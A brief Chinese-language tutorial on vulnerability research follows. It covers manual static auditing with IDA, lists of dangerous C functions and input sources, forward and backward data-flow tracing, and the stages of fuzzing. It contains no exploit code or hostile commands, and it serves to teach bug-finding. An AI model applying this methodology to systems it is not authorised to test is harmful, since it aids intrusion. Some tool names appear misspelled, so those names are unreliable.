漏洞研究主要分为漏洞分析与漏洞挖掘两部分。漏洞分析是对已发现的漏洞细节进行深入分析，为漏洞利用、补救等处理措施做铺垫。漏洞挖掘技术是指对未知漏洞的探索，综合应用各种技术和工具，尽可能找出软件中潜在的漏洞。

### 漏洞挖掘技术简介

从技术的角度讲，漏洞的存在不可避免。一般来说，软件或系统结构越复杂，发现漏洞的难度越高，但与此同时，发现漏洞的可能性越大。

目前漏洞挖掘技术可分为如下两类：
* 静态代码审计。分为源码审计和基于目标代码的漏洞挖掘。
* 模糊测试。一种不依赖于代码的黑盒测试。

### 静态代码审计

**人工代码审计**

人工分析从普遍意义上讲是一种灰盒分析技术，是指针对被分析目标程序进行代码分析，手工构造特殊输入条件，观察输出、目标状态变化等，从而获得漏洞的一种分析技术。

人工代码审计的步骤：

1. 使用IDA对目标程序进行反汇编。
2. 搜索可能造成安全漏洞的危险函数。
3. 跟踪危险函数如何获取和处理用户提供的数据的过程，判断是否存在安全漏洞。

可能造成安全漏洞的函数
1. 部分用户提供数据来源的相关函数：
    * 命令行参数：argv操作。
    * 环境变量：getenv()。
    * 数据数据文件：read()、fscanf()、getc()、fgetc()、fgets()、vfscanf()。
    * 键盘输入/stdin：read()、scanf()、getchar()、gets()。
    * 网络数据：read()、recv()、recvfrom()。
2. 部分数据操作相关的危险函数
    * 字符串复制：strcpy()、strncpy()。
    * 命令执行：system()、execve()系列。
    * 字符串合并：strcat()。
    * 格式化字符串：sprintf()、snprintf()。

在目标程序中，定位以上危险函数，然后根据危险函数参数个数、类型根据各参数，分析各缓冲区大小，判断是否存在安全漏洞。

跟踪和分析方法：

* 正向数据流跟踪：适用于用户数据输入类型的危险函数跟踪。从用户输入点开始跟踪数据处理过程中数据会对程序逻辑造成何种影响，从而判断是否造成可利用的安全漏洞。
*  数据处理逆向流跟踪：适用于数据操作类型的危险函数跟踪。跟踪常见的数据操作危险函数，反向追踪函数参数的数据流向，找出源缓冲区和目的缓冲区，确定输入的数据是否会造成安全漏洞。

两种方法各有利弊。正向跟踪流程复杂，分支较多，跟踪难度大，但是覆盖全面，可以找到所有可能的安全漏洞。而逆向跟踪的数据构造较容易、流程比较确定，却容易遗漏漏洞、覆盖面不广。

**二进制自动化漏洞审计**

二进制文件漏洞自动化审计工具的主要难题集中在如何准确的描述导致漏洞条件的行为特征上，这类行为包括越界访问分配的内存、使用未初始化的变量或直接将用户输入传给危险函数。

BugScanm是这一领域的早期探路者。是一个轻量级的漏洞分析工具，在x86平台上运行效果还是不错，但不支持Mips指令。

Mips指令系统下数据流分析：

1. 如何确定函数参数。
2. 反向数据追踪。
（任何情况下，对条件语句和循环语句种的数据流进行静态分析都是一个难题，因此采用反向数据追踪，先找到危险函数，然后搜索危险函数参数，反向追踪参数的数据来源。）

### 模糊测试Fuzzing

模糊测试大致可以分为如下五个阶段：

1. 确定输入变量。（一切向测试目标程序输入的数据都该被认为是危险的，所有输入变量都可能是存在潜在安全风险的模糊测试变量）
2. 生成模糊测试数据。
主要有两种：一种是通过预先确定的值，使用基于已存在的数据通过算法将其变异；一种是通过分析被测试应用程序及其使用的数据格式，动态生成测试数据。
3. 执行模糊测试。
4. 监视异常。
5. 根据被测试系统状态判断是否存在潜在安全漏洞。

** 工具 **：SPIKE、Sulley、Buip Suite。




